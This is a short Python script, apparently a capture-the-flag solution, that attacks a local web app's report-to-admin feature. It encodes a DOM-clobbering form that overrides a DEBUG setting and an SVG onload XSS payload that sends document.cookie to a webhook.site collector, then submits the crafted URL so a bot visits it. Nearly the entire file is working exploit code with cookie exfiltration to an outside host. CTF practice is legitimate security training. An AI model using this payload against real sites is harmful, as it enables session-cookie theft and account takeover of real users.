import requests
import base64
import urllib.parse


url = "http://172.31.0.2:8000/"
attack_server = "https://webhook.site/ffeb0575-f4e4-4280-9179-206578101d63"

title = '<form id="config"><input value="sanitize" name="DEBUG"></form>'
title = urllib.parse.quote(base64.b64encode(title.encode()).decode())

content = f'<svg/onload=fetch("{attack_server}/?flag="+document.cookie)></script>'
content = urllib.parse.quote(base64.b64encode(content.encode()).decode())

payload = f"http://book/book?title={title}&content={content}"

print(payload)

requests.post(
    url + "report",
    data={
        "url": payload,
    },
)

# you will get flag in log
